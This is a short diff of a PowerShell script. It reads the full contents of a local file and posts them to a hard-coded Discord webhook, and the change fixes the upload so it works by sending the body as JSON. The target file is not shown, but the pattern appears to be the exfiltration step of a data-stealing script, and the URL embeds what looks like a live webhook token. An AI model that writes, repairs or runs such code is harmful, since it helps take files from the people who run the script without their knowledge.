@@ -50,9 +50,11 @@ Start-Sleep -Seconds 3
 
 if (Test-Path $filePath) {
     $webhookUrl = "https://discord.com/api/webhooks/1333404978911510651/FVr2hApcOYlBDhSDad7s0Zr_kCIts4bBRz9OjYXOVsHH-uaY3nR3fNqP0bQ7lQSOGbRX"
+    
+    # Using ConvertTo-Json to format the body for the webhook
     $body = @{
         file1 = Get-Content -Path $filePath -Raw
-    }
+    } | ConvertTo-Json
 
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
 }
